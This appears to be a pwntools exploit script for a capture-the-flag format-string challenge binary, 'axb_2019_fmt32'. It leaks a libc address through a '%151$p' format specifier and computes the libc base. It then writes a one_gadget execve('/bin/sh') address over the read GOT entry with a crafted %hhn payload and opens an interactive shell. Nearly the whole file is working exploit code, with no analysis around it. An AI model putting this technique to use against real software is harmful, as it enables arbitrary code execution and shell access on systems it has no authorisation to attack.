from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

elf = ELF('./axb_2019_fmt32')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc-2.23.so')

strlenGOT = elf.got['strlen']
readGOT = elf.got['read']

io = process('./axb_2019_fmt32')


payload = b'%151$p'
io.sendafter('Please tell me:',payload)
io.recvuntil('Repeater:')
addr =  eval(io.recv(10))-247
log.info(hex(addr))

'''
0x3ac6c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac6e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac72 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac79 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbd6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''

one_gadget_list = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
libc_base = addr - libc.sym['__libc_start_main']
info(hex(libc_base))
one_gadget = libc_base + one_gadget_list[3]

byte_4th = one_gadget & 0xff
byte_3rd = ((one_gadget >> 8) & 0xff) + 256 - byte_4th
byte_2nd = ((one_gadget >> 16) & 0xff) + 256 - byte_4th - byte_3rd
byte_1st = ((one_gadget >> 24) & 0xff) + 256 - byte_4th - byte_3rd - byte_2nd

format_str = 'a%{}c%22$hhn%{}c%23$hhn%{}c%24$hhn%{}c%25$hhn'.format(byte_4th - 10, byte_3rd, byte_2nd, byte_1st) 

payload = bytes(format_str.encode())
payload += b'a'*0x9
payload += p32(readGOT)
payload += p32(readGOT+1)
payload += p32(readGOT+2)
payload += p32(readGOT+3)
info(hex(one_gadget))
#payload = b'a' + fmtstr_payload(8,{readGOT:one_gadget},numbwritten=10)

sleep(0.5)
gdb.attach(io, 'b *0x804874b')
io.sendline(payload)

io.interactive()

